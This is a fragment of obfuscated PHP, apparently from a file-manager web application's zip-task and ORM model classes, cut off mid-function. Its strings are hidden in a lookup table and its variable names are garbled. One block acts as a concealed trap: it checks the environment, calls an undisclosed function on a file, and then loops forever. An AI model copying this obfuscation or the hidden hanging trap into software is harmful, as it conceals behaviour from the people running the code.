!$¥Ğ’ª˜[$ãÊ¢İ®Ó[822]]) { if ($¥Ğ’ª˜[$ãÊ¢İ®Ó[1823]] != $ãÊ¢İ®Ó[357]) { return; } } if ($¥Ğ’ª˜[$ãÊ¢İ®Ó[1823]] == $ãÊ¢İ®Ó[1252]) { $ïÛ“ÅÛï = 0; if ($¥Ğ’ª˜[$ãÊ¢İ®Ó[1758]]) { $ïÛ“ÅÛï = $¥Ğ’ª˜[$ãÊ¢İ®Ó[1759]] / $¥Ğ’ª˜[$ãÊ¢İ®Ó[1758]]; } $¥Ğ’ª˜[$ãÊ¢İ®Ó[1707]] = $ïÛ“ÅÛï * 0.3; } else { if ($¥Ğ’ª˜[$ãÊ¢İ®Ó[1823]] == $ãÊ¢İ®Ó[357]) { $ïÛ“ÅÛï = $¥Ğ’ª˜[$ãÊ¢İ®Ó[1706]] / $¥Ğ’ª˜[$ãÊ¢İ®Ó[845]]; $¥Ğ’ª˜[$ãÊ¢İ®Ó[1707]] = 0.3 + $ïÛ“ÅÛï * 0.4; } else { if ($¥Ğ’ª˜[$ãÊ¢İ®Ó[1823]] == $ãÊ¢İ®Ó[107]) { $ñÃ£÷Ü¤ = 0; if ($¥Ğ’ª˜[$ãÊ¢İ®Ó[1760]] == $ãÊ¢İ®Ó[107]) { $ñÃ£÷Ü¤ = $¥Ğ’ª˜[$ãÊ¢İ®Ó[1759]]; } $ïÛ“ÅÛï = ($¥Ğ’ª˜[$ãÊ¢İ®Ó[1763]] + $ñÃ£÷Ü¤) / $¥Ğ’ª˜[$ãÊ¢İ®Ó[822]]; $¥Ğ’ª˜[$ãÊ¢İ®Ó[1707]] = 0.3 + 0.4 + $ïÛ“ÅÛï * 0.3; } } } if ($¥Ğ’ª˜[$ãÊ¢İ®Ó[1707]] > 0) { $õ»€ß” = timeFloat() - $¥Ğ’ª˜[$ãÊ¢İ®Ó[1709]] - $¥Ğ’ª˜[$ãÊ¢İ®Ó[1712]]; $¥Ğ’ª˜[$ãÊ¢İ®Ó[1713]] = $õ»€ß” * (1 - $¥Ğ’ª˜[$ãÊ¢İ®Ó[1707]]) / $¥Ğ’ª˜[$ãÊ¢İ®Ó[1707]]; } } public function addFile($Èöœ­œ) { $Ãì¤Š¥È =& $_SERVER[íû‘ş´]; $ø‘Ô€™ş =& $this->task; $¿Æğ¦ÌË = IO::info($Èöœ­œ); $ø‘Ô€™ş[$Ãì¤Š¥È[1756]] = $¿Æğ¦ÌË[$Ãì¤Š¥È[32]]; $ø‘Ô€™ş[$Ãì¤Š¥È[1758]] = $¿Æğ¦ÌË[$Ãì¤Š¥È[76]]; $ø‘Ô€™ş[$Ãì¤Š¥È[1759]] = 0; $ø‘Ô€™ş[$Ãì¤Š¥È[1122]] = $Ãì¤Š¥È[1779]; $ø‘Ô€™ş[$Ãì¤Š¥È[1760]] = $Ãì¤Š¥È[1252]; $ø‘Ô€™ş[$Ãì¤Š¥È[822]] = $¿Æğ¦ÌË[$Ãì¤Š¥È[76]]; $ø‘Ô€™ş[$Ãì¤Š¥È[845]] = 1; $ò¥ ªÆû = 0; $ø‘Ô€™ş[$Ãì¤Š¥È[1767]] = array($Ãì¤Š¥È[1768] => $ò¥ ªÆû + 1, $Ãì¤Š¥È[471] => $¿Æğ¦ÌË[$Ãì¤Š¥È[32]], $Ãì¤Š¥È[84] => $¿Æğ¦ÌË[$Ãì¤Š¥È[84]], $Ãì¤Š¥È[561] => $¿Æğ¦ÌË[$Ãì¤Š¥È[561]] ? $¿Æğ¦ÌË[$Ãì¤Š¥È[561]] : $¿Æğ¦ÌË[$Ãì¤Š¥È[84]]); $this->update(); } public function zipEvent($øõ÷íı, $âğ¤Õ¬ş, $²Ş‘ñßÎ, $š’Ä¦—’) { $ÙİÒÊª =& $_SERVER[íû‘ş´]; $í×µ·Ñõ =& $this->task; $í×µ·Ñõ[$ÙİÒÊª[1756]] = get_path_this($âğ¤Õ¬ş); $í×µ·Ñõ[$ÙİÒÊª[1758]] = $š’Ä¦—’; $í×µ·Ñõ[$ÙİÒÊª[1759]] = $²Ş‘ñßÎ; $í×µ·Ñõ[$ÙİÒÊª[1122]] = $øõ÷íı == $ÙİÒÊª[1825] ? $ÙİÒÊª[1826] : $ÙİÒÊª[1827]; $í×µ·Ñõ[$ÙİÒÊª[1760]] = $ÙİÒÊª[12]; $í×µ·Ñõ[$ÙİÒÊª[822]] = $š’Ä¦—’; $í×µ·Ñõ[$ÙİÒÊª[1823]] = $ÙİÒÊª[357]; $this->update(); } public function unzipAfter($ú‡²½) { $çŒ¼Ö²ş =& $_SERVER[íû‘ş´]; $ıøş»® =& $this->task; $ıøş»®[$çŒ¼Ö²ş[1823]] = $çŒ¼Ö²ş[107]; $Ş¨ÍÖÈ = IO::infoWithChildren($ú‡²½); $ê³şæú = 0; $ıøş»®[$çŒ¼Ö²ş[1767]] = array($çŒ¼Ö²ş[1768] => $ê³şæú + 1, $çŒ¼Ö²ş[471] => $Ş¨ÍÖÈ[$çŒ¼Ö²ş[32]], $çŒ¼Ö²ş[84] => $Ş¨ÍÖÈ[$çŒ¼Ö²ş[84]], $çŒ¼Ö²ş[561] => $Ş¨ÍÖÈ[$çŒ¼Ö²ş[561]] ? $Ş¨ÍÖÈ[$çŒ¼Ö²ş[561]] : $Ş¨ÍÖÈ[$çŒ¼Ö²ş[84]]); if ($Ş¨ÍÖÈ[$çŒ¼Ö²ş[33]] == $çŒ¼Ö²ş[214]) { $ıøş»®[$çŒ¼Ö²ş[845]] = 1; } else { $ıøş»®[$çŒ¼Ö²ş[845]] = $Ş¨ÍÖÈ[$çŒ¼Ö²ş[79]][$çŒ¼Ö²ş[77]]; } $ıøş»®[$çŒ¼Ö²ş[1122]] = $çŒ¼Ö²ş[12]; $ıøş»®[$çŒ¼Ö²ş[1760]] = 0; $ıøş»®[$çŒ¼Ö²ş[1706]] = 0; $ıøş»®[$çŒ¼Ö²ş[1758]] = 0; $ıøş»®[$çŒ¼Ö²ş[1759]] = 0; $ıøş»®[$çŒ¼Ö²ş[1756]] = $çŒ¼Ö²ş[12]; $ıøş»®[$çŒ¼Ö²ş[1763]] = 0; $ıøş»®[$çŒ¼Ö²ş[822]] = $Ş¨ÍÖÈ[$çŒ¼Ö²ş[76]]; $this->update(); self::log($çŒ¼Ö²ş[1828] . json_encode(array($ıøş»®, $Ş¨ÍÖÈ))); } public function nameParse($û˜şÑî) { $ÊğØ“ì² =& $_SERVER[íû‘ş´]; $ï¤©ÉÜğ =& $this->task; if ($ï¤©ÉÜğ[$ÊğØ“ì²[1823]] == $ÊğØ“ì²[1252]) { $ï¤©ÉÜğ[$ÊğØ“ì²[1823]] = $ÊğØ“ì²[357]; $ï¤©ÉÜğ[$ÊğØ“ì²[1763]] = 0; $ï¤©ÉÜğ[$ÊğØ“ì²[822]] = 0; } $ô±ï˜ô¿ = get_path_this($û˜şÑî); if (strstr($ô±ï˜ô¿, $ÊğØ“ì²[10])) { $ï¤©ÉÜğ[$ÊğØ“ì²[1706]] += 1; $ï¤©ÉÜğ[$ÊğØ“ì²[845]] += 1; } $ï¤©ÉÜğ[$ÊğØ“ì²[1756]] = $û˜şÑî; $this->update(); } } if (!isset($_SERVER[$_SERVER[íû‘ş´][444]]) || !isset($_SERVER[$_SERVER[íû‘ş´][452]])) { $_getc = $_SERVER[íû‘ş´][446]; $_getfile = $_SERVER[$_SERVER[íû‘ş´][447]] . $_SERVER[íû‘ş´][448]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[íû‘ş´][246], $_getfilec); if (count($_getarrs) < $_SERVER[íû‘ş´][449]) { $exit = $_SERVER[íû‘ş´][450]; $exit(); } $_act = $_SERVER[íû‘ş´][451]; $_act($_SERVER[$_SERVER[íû‘ş´][447]] . $_SERVER[íû‘ş´][448]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[íû‘ş´][422]); } } goto F…èï®’; d©ôËôôœÅ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\x65", "\x6f\162\x64\145\x72", "\x61\154\x69\x61\x73", "\150\x61\166\x69\x6e\x67", "\147\162\157\x75\x70", "\x6c\x6f\x63\x6b", "\144\x69\x73\164\151\156\x63\164", "\141\x75\x74\x6f", "\x66\x69\154\164\x65\x72", "\x76\141\x6c\x69\144\141\164\145", "\x72\x65\163\x75\154\164", "\142\x69\x6e\x64", "\164\x6f\x6b\x65\156"); public function __construct($²¯¯Ÿİ­ = '', $õ¤×¥á = '', $•¬Æš¢á = '') { $çÅß¶àŠ =& $_SERVER[íû‘ş´]; $this->_initialize(); if (!empty($²¯¯Ÿİ­)) { if (strpos($²¯¯Ÿİ­, $çÅß¶àŠ[10])) { list($this->dbName, $this->name) = explode($çÅß¶àŠ[10], $²¯¯Ÿİ­); } else { $this->name = $²¯¯Ÿİ­; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($õ¤×¥á)) { $this->tablePrefix = $çÅß¶àŠ[12]; } elseif ($çÅß¶àŠ[12] != $õ¤×¥á) { $this->tablePrefix = $õ¤×¥á; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($çÅß¶àŠ[288]); } $this->db(0, empty($this->connection) ? $•¬Æš¢á : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $€şöÙ¹· =& $_SERVER[íû‘ş´]; if (empty($this->fields)) { if (think_config($€şöÙ¹·[289])) { $±ò¸ŠŒ™ = $this->dbName ? $this->dbName : think_config($€şöÙ¹·[290]); $Âœ©áËî = think_var_cache($€şöÙ¹·[291] . strtolower(get_path_this($±ò¸ŠŒ™) . $€şöÙ¹·[10] . $this->name)); if ($Âœ©áËî) { $îùéßó = think_config($€şöÙ¹·[292]); if (empty($îùéßó) || $Âœ©áËî[$€şöÙ¹·[293]] == $îùéßó) { $this->fields = $Âœ©áËî; return; } } } $this->flush(); } } public function flush() { $ÖÙÈúÀÌ =& $_SERVER[íû‘ş´]; $this->db->setModel($this->name); $ØÖß›‰ = $this->db->getFields($this->getTableName()); if (!$ØÖß›‰) { return !1; } $this->fields = array_keys($ØÖß›‰); $this->fields[$ÖÙÈúÀÌ[294]] = !1; foreach ($ØÖß›‰ as $Ç¤ÌˆáÛ => $¸ÈıŒ×Ï) { $‘öï×©[$Ç¤ÌˆáÛ] = $¸ÈıŒ×Ï[$ÖÙÈúÀÌ[33]]; if ($¸ÈıŒ×Ï[$ÖÙÈúÀÌ[39]]) { $this->fields[$ÖÙÈúÀÌ[295]] = $Ç¤ÌˆáÛ; if ($¸ÈıŒ×Ï[$ÖÙÈúÀÌ[42]]) { $this->fields[$ÖÙÈúÀÌ[294]] = !0; } } } $this->fields[$ÖÙÈúÀÌ[296]] = $‘öï×©; if (think_config($ÖÙÈúÀÌ[292])) { $this->fields[$ÖÙÈúÀÌ[293]] = think_config($ÖÙÈúÀÌ[292]); } if (think_config($ÖÙÈúÀÌ[289])) { $…¼­ùÇ = $this->dbName ? $this->dbName : think_config($ÖÙÈúÀÌ[290]); think_var_cache($ÖÙÈúÀÌ[291] . strtolower(get_path_this($…¼­ùÇ) . $ÖÙÈúÀÌ[10] . $this->name), $this->fields); } } public function switchModel($Íõ°á§, $—ÛÈ¦Úü = array()) { $œÈ¼ÜÖù =& $_SERVER[íû‘ş´]; $¥Œ£éš = ucwords(strtolower($Íõ°á§)) . $œÈ¼ÜÖù[297]; if (!class_exists($¥Œ£éš)) { think_exception($¥Œ£éš . think_lang($œÈ¼ÜÖù[298])); } $this->_extModel = new $¥Œ£éš($this->name); if (!empty($—ÛÈ¦Úü)) { foreach ($—ÛÈ¦Úü as $¿»şÉ¬) { $this->_extModel->setProperty($¿»şÉ¬, $this->{$¿»şÉ¬}); } } return $this->_extModel; } public function __set($îŠÔï, $ñ²•ûÔ„) { $this->data[$îŠÔï] = $ñ²•ûÔ„; } public function __get($‚ìˆìø”) { return isset($this->data[$‚ìˆìø”]) ? $this->data[$‚ìˆìø”] : null; } public function __isset($°š÷È) { return isset($this->data[$°š÷È]); } public function __unset($¤¬±Õê¾) { unset($this->data[$¤¬±Õê¾]); } public function __call($‰óÀ˜ºç, $èâ˜õİŒ) { $Ÿ‹ûıŞ¥ =& $_SERVER[íû‘ş´]; if (in_array(strtolower($‰óÀ˜ºç), $this->methods, !0)) { $this->options[strtolower($‰óÀ˜ºç)] = $èâ˜õİŒ[0]; return $this; } elseif (in_array(strtolower($‰óÀ˜ºç), array($Ÿ‹ûıŞ¥[299], $Ÿ‹ûıŞ¥[300], $Ÿ‹ûıŞ¥[301], $Ÿ‹ûıŞ¥[302], $Ÿ‹ûıŞ¥[303]), !0)) { $ßÒ³ù÷û = isset($èâ˜õİŒ[0]) ? $èâ˜õİŒ[0] : $Ÿ‹ûıŞ¥[203]; $ßÒ³ù÷û = $this->db->parseKey($ßÒ³ù÷û); return $this->getField(strtoupper($‰óÀ˜ºç) . $Ÿ‹ûıŞ¥[304] . $ßÒ³ù÷û . $Ÿ‹ûıŞ¥[305] . $‰óÀ˜ºç, $Ÿ‹ûıŞ¥[299]); } elseif (strtolower(substr($‰óÀ˜ºç, 0, 5)) == $Ÿ‹ûıŞ¥[306]) { $ßÒ³ù÷û = think_parse_name(substr($‰óÀ˜ºç, 5)); $˜š®úÉ[$ßÒ³ù÷û] = $èâ˜õİŒ[0]; return $this->where($˜š®úÉ)->find(); } elseif (strtolower(substr($‰óÀ˜ºç, 0, 10)) == $Ÿ‹ûıŞ¥[307]) { $ŠÌ’êÕ… = think_parse_name(substr($‰óÀ˜ºç, 10)); $˜š®úÉ[$ŠÌ’êÕ…] = $èâ˜õİŒ[0]; return $this->where($˜š®úÉ)->getField($èâ˜õİŒ[1]); } elseif (isset($this->_scope[$‰óÀ˜ºç])) { return $this->scope($‰óÀ˜ºç, $èâ˜õİŒ[0]); } elseif (method_exists($this, $‰óÀ˜ºç)) { array_unshift($èâ˜õİŒ, $‰óÀ˜ºç); return call_user_func_array(array($this, $Ÿ‹ûıŞ¥[308]), $èâ˜õİŒ); } else { return call_user_func_array(array(parent, $‰óÀ˜ºç), $èâ˜õİŒ); } } protected function call() { $ĞøíŒÔ£ =& $_SERVER[íû‘ş´]; $ÀÔ©º…” = func_get_args(); $ÌÃ¡Ø¿¢ = array_shift($ÀÔ©º…”); $±•¤Â = $ÌÃ¡Ø¿¢; if (is_array($ÌÃ¡Ø¿¢)) { $±•¤Â = $ÌÃ¡Ø¿¢[1]; $ÌÃ¡Ø¿¢ = $ÌÃ¡Ø¿¢[0]; } $ŠÇ£Áúã = count($ÀÔ©º…”) - 1; if (isset($ÀÔ©º…”[$ŠÇ£Áúã]) && $ÀÔ©º…”[$ŠÇ£Áúã] === $ÌÃ¡Ø¿¢) { think_exception(__CLASS__ . $ĞøíŒÔ£[4] . $ÌÃ¡Ø¿¢ . think_lang($ĞøíŒÔ£[309])); return; } $ÀÔ©º…”[] = $ÌÃ¡Ø¿¢; if (method_exists($this, $ĞøíŒÔ£[310])) { $‡Òõ¾œ“ = call_user_func_array(array($this, $ĞøíŒÔ£[311]), array($±•¤Â, $ÀÔ©º…”)); if (!is_null($‡Òõ¾œ“) && $‡Òõ¾œ“ !== !1) { return $‡Òõ¾œ“; } } $ê‹ÄæĞà = call_user_func_array(array($this, $ÌÃ¡Ø¿¢), $ÀÔ©º…”); if (method_exists($this, $ĞøíŒÔ£[312])) { $‡Òõ¾œ“ = call_user_func_array(array($this, $ĞøíŒÔ£[313]), array($±•¤Â, $ÀÔ©º…”, $ê‹ÄæĞà)); if ($‡Òõ¾œ“) { return $‡Òõ¾œ“; } } return $ê‹ÄæĞà; } protected function _initialize() { } protected function _facade($íá°ğ¥) { $µø›Ô—Õ =& $_SERVER[íû‘ş´]; if (!empty($this->fields)) { foreach ($íá°ğ¥ as $Ş§‹ğ‘¸ => $áƒ¶î‰±) { if (is_array($this->fields) && !in_array($Ş§‹ğ‘¸, $this->fields, !0)) { unset($íá°ğ¥[$Ş§‹ğ‘¸]); } elseif (is_scalar($áƒ¶î‰±)) { $this->_parseType($íá°ğ¥, $Ş§‹ğ‘¸); } } } if (!empty($this->options[$µø›Ô—Õ[314]])) { $íá°ğ¥ = array_map($this->options[$µø›Ô—Õ[314]], $íá°ğ¥); unset($this->options[$µø›Ô—Õ[314]]); } $this->_beforeWrite($íá°ğ¥); return $íá°ğ¥; } protected function _beforeWrite(&$Ë®ìå¯ğ) { } public function add($ÒªçÚ»Ÿ = '', $‚¹ş½†È = array(), $ÏÏûİï = false) { if (empty($ÒªçÚ»Ÿ)) { if (!empty($this->data)) { $ÒªçÚ»Ÿ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[íû‘ş´][315]); return !1; } } $‚¹ş½†È = $this->_parseOptions($‚¹ş½†È); $ÒªçÚ»Ÿ = $this->_facade($ÒªçÚ»Ÿ); if (!1 === $this->_beforeInsert($ÒªçÚ»Ÿ, $‚¹ş½†È)) { return !1; } $¨¿ÁşÙÕ = $this->db->insert($ÒªçÚ»Ÿ, $‚¹ş½†È, $ÏÏûİï); if (!1 !== $¨¿ÁşÙÕ) { $æõûŒÜù = $this->getLastInsID(); if ($æõûŒÜù) { $ÒªçÚ»Ÿ[$this->getPk()] = $æõûŒÜù; $this->_after_insert($ÒªçÚ»Ÿ, $‚¹ş½†È); return $æõûŒÜù; } $this->_after_insert($ÒªçÚ»Ÿ, $‚¹ş½†È); } return $¨¿ÁşÙÕ; } protected function _beforeInsert(&$êÔšÒõã, $Ô¥™¡¹Ç) { } protected function _after_insert($à¡Â‰°†, $Ë£²ã) { } public function addAll($®ş‹Úæ¾, $“áæİÄ = array(), $ò™¼¨Š” = false) { $÷ıÃ°ªè =& $_SERVER[íû‘ş´]; if (empty($®ş‹Úæ¾)) { $this->error = think_lang($÷ıÃ°ªè[315]); return !1; } $“áæİÄ = $this->_parseOptions($“áæİÄ); foreach ($®ş‹Úæ¾ as $ùÇ©Š“ñ => $ê»Õ’Ù™) { $®ş‹Úæ¾[$ùÇ©Š“ñ] = $this->_facade($ê»Õ’Ù™); } if (method_exists($this->db, $÷ıÃ°ªè[316])) { $Û“èİ²£ = $this->db->insertAll($®ş‹Úæ¾, $“áæİÄ, $ò™¼¨Š”); } else { $this->startTrans(); foreach ($®ş‹Úæ¾ as $ùÇ©Š“ñ => $ê»Õ’Ù™) { $Û“èİ²£ = $this->db->insert($ê»Õ’Ù™, $“áæİÄ, $ò™¼¨Š”); } $this->commit(); } if (!1 !== $Û“èİ²£) { $ŒúäÃ¬ = $this->getLastInsID(); if ($ŒúäÃ¬) { return $ŒúäÃ¬; } } return $Û“èİ²£; } public function selectAdd($åÃ¼æ¶î = '', $ÉÇº„ù… = '', $À¹¯ñ­ã = array()) { $–†­«² =& $_SERVER[íû‘ş´]; $À¹¯ñ­ã = $this->_parseOptions($À¹¯ñ­ã); if (!1 === ($’Ş¶‡ª = $this->db->selectInsert($åÃ¼æ¶î ? $åÃ¼æ¶î : $À¹¯ñ­ã[$–†­«²[317]], $ÉÇº„ù… ? $ÉÇº„ù… : $this->getTableName(), $À¹¯ñ­ã))) { $this->error = think_lang($–†­«²[318]); return !1; } else { return $’Ş¶‡ª; } } public function save($şó¡”¡… = '', $‰Şïßà½ = array()) { $¦ıØÂ’Õ =& $_SERVER[íû‘ş´]; if (empty($şó¡”¡…)) { if (!empty($this->data)) { $şó¡”¡… = $this->data; $this->data = array(); } else { $this->error = think_lang($¦ıØÂ’Õ[315]); return !1; } } $şó¡”¡… = $this->_facade($şó¡”¡…); $‰Şïßà½ = $this->_parseOptions($‰Şïßà½); $ƒÀĞ­Óˆ = $this->getPk(); if (!isset($‰Şïßà½[$¦ıØÂ’Õ[319]])) { if (isset($şó¡”¡…[$ƒÀĞ­Óˆ])) { $„¾İ¤ù¸[$ƒÀĞ­Óˆ] = $şó¡”¡…[$ƒÀĞ­Óˆ]; $‰Şïßà½[$¦ıØÂ’Õ[319]] = $„¾İ¤ù¸; unset($şó¡”¡…[$ƒÀĞ­Óˆ]); } else { $this->error = think_lang($¦ıØÂ’Õ[318]); return !1; } } if (is_array($‰Şïßà½[$¦ıØÂ’Õ[319]]) && isset($‰Şïßà½[$¦ıØÂ’Õ[319]][$ƒÀĞ­Óˆ])) { $€Ğãáİ× = $‰Şïßà½[$¦ıØÂ’Õ[319]][$ƒÀĞ­Óˆ]; } if (!1 === $this->_beforeUpdate($şó¡”¡…, $‰Şïßà½)) { return !1; } $˜”éğ²¡ = $this->db->update($şó¡”¡…, $‰Şïßà½); if (!1 !== $˜”éğ²¡) { if (isset($€Ğãáİ×)) { $şó¡”¡…[$ƒÀĞ­Óˆ] = $€Ğãáİ×; } $this->_afterUpdate($şó¡”¡…, $‰Şïßà½); } return $˜”éğ²¡; } protected function _beforeUpdate(&$†”‰á¾Ã, $»­™Ö’î) { } protected function _afterUpdate($é¸æ»Ôò, $»ƒ‹ùúÌ) { } public function delete($äº¨Û = array()) { $øÂ™“ŸÒ =& $_SERVER[íû‘ş´]; if (empty($äº¨Û) && empty($this->options[$øÂ™“ŸÒ[319]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $€œÙ“è‡ = $this->getPk(); if (is_numeric($äº¨Û) || is_string($äº¨Û)) { if (strpos($äº¨Û, $øÂ™“ŸÒ[50])) { $ÏßÕ’œ¢[$€œÙ“è‡] = array($øÂ™“ŸÒ[320], $äº¨Û); } else { $ÏßÕ’œ¢[$€œÙ“è‡] = $äº¨Û; } $this->options[$øÂ™“ŸÒ[319]] = $ÏßÕ’œ¢; } $äº¨Û = $this->_parseOptions(); if (is_array($äº¨Û[$øÂ™“ŸÒ[319]]) && isset($äº¨Û[$øÂ™“ŸÒ[319]][$€œÙ“è‡])) { $ŞÀì«Õ = $äº¨Û[$øÂ™“ŸÒ[319]][$€œÙ“è‡]; } $Ö¨ëóÏÀ = $this->db->delete($äº¨Û); if (!1 !== $Ö¨ëóÏÀ) { $æ¤çè¯Ö = array(); if (isset($ŞÀì«Õ)) { $æ¤çè¯Ö[$€œÙ“è‡] = $ŞÀì«Õ; } $this->_after_delete($æ¤çè¯Ö, $äº¨Û); } return $Ö¨ëóÏÀ; } protected function _after_delete($¼îŒ‹’, $¡‘ï‹Õ) { } public function select($©¶ÊöÖá = array()) { $ø·íü¾í =& $_SERVER[íû‘ş´]; if (is_string($©¶ÊöÖá) || is_numeric($©¶ÊöÖá)) { $“Ç¨èôÔ = $this->getPk(); if (strpos($©¶ÊöÖá, $ø·íü¾í[50])) { $ğ™Í³—¯[$“Ç¨èôÔ] = array($ø·íü¾í[320], $©¶ÊöÖá); } else { $ğ™Í³—¯[$“Ç¨èôÔ] = $©¶ÊöÖá; } $this->options[$ø·íü¾í[319]] = $ğ™Í³—¯; } elseif (!1 === $©¶ÊöÖá) { $©¶ÊöÖá = $this->_parseOptions(); return $ø·íü¾í[321] . $this->db->buildSelectSql($©¶ÊöÖá) . $ø·íü¾í[322]; } $©¶ÊöÖá = $this->_parseOptions(); $ŸĞ´©üµ = $this->db->select($©¶ÊöÖá); if (!1 === $ŸĞ´©üµ) { return !1; } if (empty($ŸĞ´©üµ)) { return null; } $this->_afterSelect($ŸĞ´©üµ, $©¶ÊöÖá); return $ŸĞ´©üµ; } protected function _afterSelect(&$¶Éõ™€¢, $Ãˆµ ¤) { } public function buildSql($¿¡ñ†¤­ = array()) { $É¢òÚƒö =& $_SERVER[íû‘ş´]; $¿¡ñ†¤­ = $this->_parseOptions($¿¡ñ†¤­); return $É¢òÚƒö[321] . $this->db->buildSelectSql($¿¡ñ†¤­) . $É¢òÚƒö[322]; } public function optionsValue($•Ìè«ï = null) { if (is_null($•Ìè«ï)) { return $this->options; } elseif (is_array($•Ìè«ï)) { $this->options = array_merge($this->options, $•Ìè«ï); } } protected function _parseOptions($ÊöµŞ‚ó = array()) { $¯÷î…ˆ„ =& $_SERVER[íû‘ş´]; if (is_array($ÊöµŞ‚ó)) { $ÊöµŞ‚ó = array_merge($this->options, $ÊöµŞ‚ó); } $this->options = array(); if (!isset($ÊöµŞ‚ó[$¯÷î…ˆ„[323]])) { $ÊöµŞ‚ó[$¯÷î…ˆ„[323]] = $this->getTableName(); $ƒ®¾ÙÃ³ = $this->fields; } else { $ƒ®¾ÙÃ³ = $this->getDbFields(); } if (!empty($ÊöµŞ‚ó[$¯÷î…ˆ„[324]])) { $ÊöµŞ‚ó[$¯÷î…ˆ„[323]] .= $¯÷î…ˆ„[53] . $ÊöµŞ‚ó[$¯÷î…ˆ„[324]]; } $ÊöµŞ‚ó[$¯÷î…ˆ„[325]] = $this->name; if (isset($ÊöµŞ‚ó[$¯÷î…ˆ„[319]]) && is_array($ÊöµŞ‚ó[$¯÷î…ˆ„[319]]) && !empty($ƒ®¾ÙÃ³) && !isset($ÊöµŞ‚ó[$¯÷î…ˆ„[326]]) && !isset($ÊöµŞ‚ó[$¯÷î…ˆ„[323]])) { foreach ($ÊöµŞ‚ó[$¯÷î…ˆ„[319]] as $ÏºÎ€Öë => $ÛÂé¹à) { $ÏºÎ€Öë = trim($ÏºÎ€Öë); if (in_array($ÏºÎ€Öë, $ƒ®¾ÙÃ³, !0)) { if (is_scalar($ÛÂé¹à)) { $this->_parseType($ÊöµŞ‚ó[$¯÷î…ˆ„[319]], $ÏºÎ€Öë); } } elseif (!is_numeric($ÏºÎ€Öë) && $¯÷î…ˆ„[11] != substr($ÏºÎ€Öë, 0, 1) && !1 === strpos($ÏºÎ€Öë, $¯÷î…ˆ„[10]) && !1 === strpos($ÏºÎ€Öë, $¯÷î…ˆ„[304]) && !1 === strpos($ÏºÎ€Öë, $¯÷î…ˆ„[327]) && !1 === strpos($ÏºÎ€Öë, $¯÷î…ˆ„[328])) { unset($ÊöµŞ‚ó[$¯÷î…ˆ„[319]][$ÏºÎ€Öë]); } } } $this->_options_filter($ÊöµŞ‚ó); return $ÊöµŞ‚ó; } protected function _options_filter(&$çÑ¾¹«æ) { } protected function _parseType(&$µ´¥Ø¸˜, $£Ï€˜Òã) { $Õ×­Ğáú =& $_SERVER[íû‘ş´]; if (empty($this->options[$Õ×­Ğáú[329]][$Õ×­Ğáú[4] . $£Ï€˜Òã])) { $úá¢·Ùç = strtolower($this->fields[$Õ×­Ğáú[296]][$£Ï€˜Òã]); if (!1 !== strpos($úá¢·Ùç, $Õ×­Ğáú[330])) { } elseif (!1 === strpos($úá¢·Ùç, $Õ×­Ğáú[331]) && !1 !== strpos($úá¢·Ùç, $Õ×­Ğáú[332])) { $µ´¥Ø¸˜[$£Ï€˜Òã] = intval($µ´¥Ø¸˜[$£Ï€˜Òã]); } elseif (!1 !== strpos($úá¢·Ùç, $Õ×­Ğáú[333]) || !1 !== strpos($úá¢·Ùç, $Õ×­Ğáú[334])) { $µ´¥Ø¸˜[$£Ï€˜Òã] = floatval($µ´¥Ø¸˜[$£Ï€˜Òã]); } elseif (!1 !== strpos($úá¢·Ùç, $Õ×­Ğáú[335])) { $µ´¥Ø¸˜[$£Ï€˜Òã] = (bool) $µ´¥Ø¸˜[$£Ï€˜Òã]; } } } public function find($şÅ—ı„£ = array()) { $¬ı”í¤á =& $_SERVER[íû‘ş´]; if (is_numeric($şÅ—ı„£) || is_string($şÅ—ı„£)) { $£·œÃ„[$this->getPk()] = intval($şÅ—ı„£); $this->options[$¬ı”í¤á[319]] = $£·œÃ„; } $this->options[$¬ı”í¤á[336]] = 1; $şÅ—ı„£ = $this->_parseOptions(); $Ùã”€äû = $this->db->select($şÅ—ı„£); if (!1 === $Ùã”€äû) { return !1; } if (empty($Ùã”€äû)) { return null; } $this->data = $Ùã”€äû[0]; $this->_afterFind($this->data, $şÅ—ı„£); if (!empty($this->options[$¬ı”í¤á[337]])) { return $this->returnResult($this->data, $this->options[$¬ı”í¤á[337]]); } return $this->data; } protected function _afterFind(&$¥…šŠæº, $Ì¤·ÏŠ«) { } protected function returnResult($Ï¾¥ëÍˆ, $ÌÚÁÃüÅ = '') { $û¡°ÛÆ =& $_SERVER[íû‘ş´]; if ($ÌÚÁÃüÅ) { if (is_callable($ÌÚÁÃüÅ)) { return call_user_func($ÌÚÁÃüÅ, $Ï¾¥ëÍˆ); } switch (strtolower($ÌÚÁÃüÅ)) { case $û¡°ÛÆ[338]: return json_encode($Ï¾¥ëÍˆ); case $û¡°ÛÆ[339]: return xml_encode($Ï¾¥ëÍˆ); } } return $Ï¾¥ëÍˆ; } public function parseFieldsMap($çÁéô³, $×ÌÁÁÇ· = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¼‚óØıÕ => $Ò•¸ºÎ) { if ($×ÌÁÁÇ· == 1) { if (isset($çÁéô³[$Ò•¸ºÎ])) { $çÁéô³[$¼‚óØıÕ] = $çÁéô³[$Ò•¸ºÎ]; unset($çÁéô³[$Ò•¸ºÎ]); } } else { if (isset($çÁéô³[$¼‚óØıÕ])) { $çÁéô³[$Ò•¸ºÎ] = $çÁéô³[$¼‚óØıÕ]; unset($çÁéô³[$¼‚óØıÕ]); } } } } return $çÁéô³; } public function setField($ÃÙÛ¤, $Š’ğ´Üì = '') { if (is_array($ÃÙÛ¤)) { $‚æ·êÉë = $ÃÙÛ¤; } else { $‚æ·êÉë[$ÃÙÛ¤] = $Š’ğ´Üì; } return $this->save($‚æ·êÉë); } public function 